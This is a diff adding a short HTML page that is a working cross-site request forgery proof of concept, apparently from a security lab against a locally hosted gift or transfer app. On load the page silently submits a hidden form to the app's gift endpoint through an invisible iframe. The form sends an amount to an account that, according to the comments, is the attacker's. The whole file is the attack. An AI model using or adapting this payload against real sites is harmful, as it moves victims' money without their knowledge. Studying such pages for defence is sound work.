@@ -1,0 +1,13 @@
+<html>
+	<head>
+		<title>Form</title>
+	</head>
+	<body onload="document.csrfform.submit()">
+		<h1>I promise I'm not hacking you right now</h1>
+		<form action="http://127.0.0.1:8000/gift/0" method="post" target="hiddenframe" name="csrfform">
+			<input type="hidden" name="username" value="hey@gmail.com" /> <!-- username value needs to be the attackers account -->
+			<input type="hidden" name="amount" value="420" /> <!-- value needs to be the amount scammed, this needs to change at every attack since there's a unique constraint -->
+		</form>
+		<iframe name="hiddenframe" style="display: none;"></iframe>
+	</body>
+</html>
